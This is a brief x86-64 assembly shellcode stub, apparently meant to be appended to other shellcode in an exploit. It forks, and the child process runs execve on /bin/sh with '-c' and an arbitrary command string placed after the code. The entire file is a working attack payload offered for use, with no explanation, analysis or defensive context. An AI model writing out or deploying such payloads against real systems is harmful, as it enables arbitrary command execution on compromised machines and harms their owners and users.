BITS 64

; add a command after the shellcode

xor rax, rax
mov al, 57
syscall                             ; fork()
test rax, rax
jz child
ret

run:
    push rsi                        ; argv[1] = "-c"
    push rdi                        ; argv[0] = "/bin/sh"
    mov rsi, rsp                    ; *argv
    mov al, 59
    syscall                         ; execve("/bin/sh", ["/bin/sh", "-c", cmd], 0)

child:
    xor rax, rax
    xor rdx, rdx                    ; envp
    mov rdi, 0x68732f6e69622f       ; "/bin/sh"
    push rax
    push rdi
    mov rdi, rsp                    ; *filename
    push rax
    push word 0x632d                ; "-c"
    mov rsi, rsp
    push rax
    call run
    db ""                           ; command -> argv[2] = cmd
